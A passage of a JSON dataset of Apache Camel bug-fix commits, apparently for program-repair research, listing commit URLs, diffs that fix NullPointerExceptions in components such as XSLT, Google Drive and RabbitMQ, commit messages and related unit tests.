@param annotationType the annotation type\n      * @param checkMetaAnnotations check for meta annotations\n@@ -585,7 +612,7 @@ public static boolean hasAnnotation(AnnotatedElement elem, Class<? extends Annot\n \n     /**\n      * Turns the given object arrays into a meaningful string\n-     * \n+     *\n      * @param objects an array of objects or null\n      * @return a meaningful string\n      */\n@@ -682,7 +709,7 @@ public static boolean hasAnnotation(Annotation[] annotations, Class<?> type) {\n     /**\n      * Closes the given resource if it is available, logging any closing\n      * exceptions to the given log\n-     * \n+     *\n      * @param closeable the object to close\n      * @param name the name of the resource\n      * @param log the log to use when reporting closure warnings\n@@ -799,7 +826,7 @@ public static boolean evaluateValuePredicate(Object value) {\n     /**\n      * Wraps the caused exception in a {@link RuntimeCamelException} if its not\n      * already such an exception.\n-     * \n+     *\n      * @param e the caused exception\n      * @return the wrapper exception\n      */",
                "raw_url": "https://github.com/apache/camel/raw/f7f3a442738221300f707ae5dc8b9323706d083e/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "sha": "c9674de68d6e7430b33f83c9b5f0d77e79f692cd",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1301: Fixed NPE in factory finder and improved ObjectHelper.loadClass\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@739199 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/55850e1e30610adcd3418f7e374291fc56a35a68",
        "patched_files": [
            "ObjectHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ObjectHelperTest.java"
        ]
    },
    "camel_f8926d4": {
        "bug_id": "camel_f8926d4",
        "commit": "https://github.com/apache/camel/commit/f8926d4b11751d1359242fe0a10383ca2cd1d259",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/f8926d4b11751d1359242fe0a10383ca2cd1d259/camel-core/src/main/java/org/apache/camel/builder/xml/XsltBuilder.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/builder/xml/XsltBuilder.java?ref=f8926d4b11751d1359242fe0a10383ca2cd1d259",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/builder/xml/XsltBuilder.java",
                "patch": "@@ -458,7 +458,7 @@ protected Source getSource(Exchange exchange, Object body) {\n         if (body != null) {\n             TypeConverter tc = exchange.getContext().getTypeConverterRegistry().lookup(Source.class, body.getClass());\n             if (tc != null) {\n-                source = tc.convertTo(Source.class, body);\n+                source = tc.convertTo(Source.class, exchange, body);\n             }\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/f8926d4b11751d1359242fe0a10383ca2cd1d259/camel-core/src/main/java/org/apache/camel/builder/xml/XsltBuilder.java",
                "sha": "f0c714ef8b2ffa441c1a3a508cd30a2a371a8a43",
                "status": "modified"
            },
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/f8926d4b11751d1359242fe0a10383ca2cd1d259/camel-core/src/test/java/org/apache/camel/component/xslt/XsltRouteTest.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/xslt/XsltRouteTest.java?ref=f8926d4b11751d1359242fe0a10383ca2cd1d259",
                "deletions": 6,
                "filename": "camel-core/src/test/java/org/apache/camel/component/xslt/XsltRouteTest.java",
                "patch": "@@ -24,17 +24,20 @@\n import org.apache.camel.component.mock.MockEndpoint;\n import org.apache.camel.impl.JndiRegistry;\n \n-/**\n- *\n- */\n public class XsltRouteTest extends ContextTestSupport {\n+    public void testSendStringMessage() throws Exception {\n+        sendMessageAndHaveItTransformed(\"<mail><subject>Hey</subject><body>Hello world!</body></mail>\");\n+    }\n+    \n+    public void testSendBytesMessage() throws Exception {\n+        sendMessageAndHaveItTransformed(\"<mail><subject>Hey</subject><body>Hello world!</body></mail>\".getBytes());\n+    }\n \n-    public void testSendMessageAndHaveItTransformed() throws Exception {\n+    private void sendMessageAndHaveItTransformed(Object body) throws Exception {\n         MockEndpoint endpoint = getMockEndpoint(\"mock:result\");\n         endpoint.expectedMessageCount(1);\n \n-        template.sendBody(\"direct:start\",\n-                \"<mail><subject>Hey</subject><body>Hello world!</body></mail>\");\n+        template.sendBody(\"direct:start\", body);\n \n         assertMockEndpointsSatisfied();\n ",
                "raw_url": "https://github.com/apache/camel/raw/f8926d4b11751d1359242fe0a10383ca2cd1d259/camel-core/src/test/java/org/apache/camel/component/xslt/XsltRouteTest.java",
                "sha": "8285ad6f6c9824f6939d0d64ecf836314c3a2f7d",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5864 fixed the camel-xslt component NPE when the message body is byte[]\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1420523 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/ede38514e385fb1df526c2ce711c71c3ae9a7d15",
        "patched_files": [
            "XsltBuilder.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "XsltBuilderTest.java",
            "XsltRouteTest.java"
        ]
    },
    "camel_f99ac1c": {
        "bug_id": "camel_f99ac1c",
        "commit": "https://github.com/apache/camel/commit/f99ac1cb7592ffc98eed1d1816ac5b8d77851d61",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/f99ac1cb7592ffc98eed1d1816ac5b8d77851d61/camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateTimeoutWithExecutorServiceTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateTimeoutWithExecutorServiceTest.java?ref=f99ac1cb7592ffc98eed1d1816ac5b8d77851d61",
                "deletions": 1,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateTimeoutWithExecutorServiceTest.java",
                "patch": "@@ -57,7 +57,7 @@ public static int aggregateThreadsCount() {\n         Thread[] threads = new Thread[threadGroup.activeCount()];\n         threadGroup.enumerate(threads);\n         for (Thread thread : threads) {\n-            if (thread.getName().contains(AggregateProcessor.AGGREGATE_TIMEOUT_CHECKER)) {\n+            if (thread != null && thread.getName().contains(AggregateProcessor.AGGREGATE_TIMEOUT_CHECKER)) {\n                 ++count;\n             }\n         }",
                "raw_url": "https://github.com/apache/camel/raw/f99ac1cb7592ffc98eed1d1816ac5b8d77851d61/camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateTimeoutWithExecutorServiceTest.java",
                "sha": "8ff53ffaaac4da25d63c7332d586c3e901bdb5ef",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE testing on CI servers on various platforms\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1414564 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/3ed2e3f497c47bef7dbc1aafd75f8d47c019ee43",
        "patched_files": [],
        "repo": "camel",
        "unit_tests": [
            "AggregateTimeoutWithExecutorServiceTest.java"
        ]
    },
    "camel_fab550a": {
        "bug_id": "camel_fab550a",
        "commit": "https://github.com/apache/camel/commit/fab550a7e21467acff6307e707c09d4a90820267",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/fab550a7e21467acff6307e707c09d4a90820267/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveComponent.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveComponent.java?ref=fab550a7e21467acff6307e707c09d4a90820267",
                "deletions": 3,
                "filename": "components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveComponent.java",
                "patch": "@@ -44,10 +44,11 @@ protected GoogleDriveApiName getApiName(String apiNameStr) throws IllegalArgumen\n         return GoogleDriveApiName.fromValue(apiNameStr);\n     }\n \n-    public Drive getClient() {\n+    public Drive getClient(GoogleDriveConfiguration googleDriveConfiguration) {\n         if (client == null) {\n-            client = getClientFactory().makeClient(configuration.getClientId(), configuration.getClientSecret(), configuration.getScopes(), \n-                configuration.getApplicationName(), configuration.getRefreshToken(), configuration.getAccessToken());\n+            client = getClientFactory().makeClient(googleDriveConfiguration.getClientId(), googleDriveConfiguration.getClientSecret(), \n+                    googleDriveConfiguration.getScopes(), googleDriveConfiguration.getApplicationName(), \n+                    googleDriveConfiguration.getRefreshToken(), googleDriveConfiguration.getAccessToken());\n         }\n         return client;\n     }\n@@ -69,6 +70,9 @@ public void setConfiguration(GoogleDriveConfiguration configuration) {\n \n     @Override\n     public GoogleDriveConfiguration getConfiguration() {\n+        if (configuration == null) {\n+            configuration = new GoogleDriveConfiguration();\n+        }\n         return super.getConfiguration();\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/fab550a7e21467acff6307e707c09d4a90820267/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveComponent.java",
                "sha": "84dc9e2f3293c1162a61c8421bab575695bb6c1e",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/fab550a7e21467acff6307e707c09d4a90820267/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveEndpoint.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveEndpoint.java?ref=fab550a7e21467acff6307e707c09d4a90820267",
                "deletions": 1,
                "filename": "components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveEndpoint.java",
                "patch": "@@ -124,7 +124,7 @@ protected void afterConfigureProperties() {\n     }\n     \n     public Drive getClient() {\n-        return ((GoogleDriveComponent)getComponent()).getClient();\n+        return ((GoogleDriveComponent)getComponent()).getClient(configuration);\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/fab550a7e21467acff6307e707c09d4a90820267/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveEndpoint.java",
                "sha": "b80a2df31907e68ef50c25ecf8ceb73ac054e622",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/fab550a7e21467acff6307e707c09d4a90820267/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveFilesConverter.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveFilesConverter.java?ref=fab550a7e21467acff6307e707c09d4a90820267",
                "deletions": 1,
                "filename": "components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveFilesConverter.java",
                "patch": "@@ -98,6 +98,7 @@ public static String downloadContentAsString(com.google.api.services.drive.model\n     }\n     \n     private static Drive getClient(Exchange exchange) {\n-        return exchange.getContext().getComponent(\"google-drive\", GoogleDriveComponent.class).getClient();\n+        GoogleDriveComponent component = exchange.getContext().getComponent(\"google-drive\", GoogleDriveComponent.class);\n+        return component.getClient(component.getConfiguration());\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/fab550a7e21467acff6307e707c09d4a90820267/components/camel-google-drive/src/main/java/org/apache/camel/component/google/drive/GoogleDriveFilesConverter.java",
                "sha": "d2273011aa8a2895359a8109f3c3633fee9ca606",
                "status": "modified"
            }
        ],
        "message": "CAMEL-10381 - fix NPE from component configuration",
        "parent": "https://github.com/apache/camel/commit/404ecc5625b34dd011f5257206cda4d60341bfac",
        "patched_files": [
            "GoogleDriveFilesConverter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "GoogleDriveFilesConverterTest.java"
        ]
    },
    "camel_fb74240": {
        "bug_id": "camel_fb74240",
        "commit": "https://github.com/apache/camel/commit/fb742406c6083f31c1098d487531556618262cdc",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/fb742406c6083f31c1098d487531556618262cdc/camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java?ref=fb742406c6083f31c1098d487531556618262cdc",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java",
                "patch": "@@ -28,6 +28,7 @@\n import org.apache.camel.util.AttachmentMap;\n import org.apache.camel.util.CaseInsensitiveMap;\n import org.apache.camel.util.EndpointHelper;\n+import org.apache.camel.util.ObjectHelper;\n \n /**\n  * The default implementation of {@link org.apache.camel.Message}\n@@ -67,6 +68,8 @@ public Object getHeader(String name, Object defaultValue) {\n     }\n \n     public Object getHeader(String name, Supplier<Object> defaultValueSupplier) {\n+        ObjectHelper.notNull(name, \"name\");\n+        ObjectHelper.notNull(defaultValueSupplier, \"defaultValueSupplier\");\n         Object answer = getHeaders().get(name);\n         return answer != null ? answer : defaultValueSupplier.get();\n     }\n@@ -123,6 +126,9 @@ public Object getHeader(String name, Supplier<Object> defaultValueSupplier) {\n \n     @SuppressWarnings(\"unchecked\")\n     public <T> T getHeader(String name, Supplier<Object> defaultValueSupplier, Class<T> type) {\n+        ObjectHelper.notNull(name, \"name\");\n+        ObjectHelper.notNull(type, \"type\");\n+        ObjectHelper.notNull(defaultValueSupplier, \"defaultValueSupplier\");\n         Object value = getHeader(name, defaultValueSupplier);\n         if (value == null) {\n             // lets avoid NullPointerException when converting to boolean for null values",
                "raw_url": "https://github.com/apache/camel/raw/fb742406c6083f31c1098d487531556618262cdc/camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java",
                "sha": "57bedfad67e67ea9163c3a6555423c75ea26bad5",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/fb742406c6083f31c1098d487531556618262cdc/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java?ref=fb742406c6083f31c1098d487531556618262cdc",
                "deletions": 2,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "patch": "@@ -220,7 +220,7 @@ protected boolean processInOut(final Exchange exchange, final AsyncCallback call\n             exchangeName = getEndpoint().getExchangeName();\n         }\n \n-        String key = in.getHeader(RabbitMQConstants.ROUTING_KEY, null, String.class);\n+        String key = in.getHeader(RabbitMQConstants.ROUTING_KEY, String.class);\n         // we just need to make sure RoutingKey option take effect if it is not BridgeEndpoint\n         if (key == null || getEndpoint().isBridgeEndpoint()) {\n             key = getEndpoint().getRoutingKey() == null ? \"\" : getEndpoint().getRoutingKey();\n@@ -245,7 +245,7 @@ protected boolean processInOut(final Exchange exchange, final AsyncCallback call\n     private boolean processInOnly(Exchange exchange, AsyncCallback callback) throws Exception {\n         String exchangeName = getEndpoint().getExchangeName(exchange.getIn());\n \n-        String key = exchange.getIn().getHeader(RabbitMQConstants.ROUTING_KEY, null, String.class);\n+        String key = exchange.getIn().getHeader(RabbitMQConstants.ROUTING_KEY, String.class);\n         // we just need to make sure RoutingKey option take effect if it is not BridgeEndpoint\n         if (key == null || getEndpoint().isBridgeEndpoint()) {\n             key = getEndpoint().getRoutingKey() == null ? \"\" : getEndpoint().getRoutingKey();",
                "raw_url": "https://github.com/apache/camel/raw/fb742406c6083f31c1098d487531556618262cdc/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "sha": "3e45c15cd59c3548185f377c25da1dfbd9af8149",
                "status": "modified"
            }
        ],
        "message": "[CAMEL-11093] NPE when defaultValueProvider not given",
        "parent": "https://github.com/apache/camel/commit/c54509df553933ffa641dddbb6d7929031f3c6a7",
        "patched_files": [
            "RabbitMQProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RabbitMQProducerTest.java"
        ]
    }
}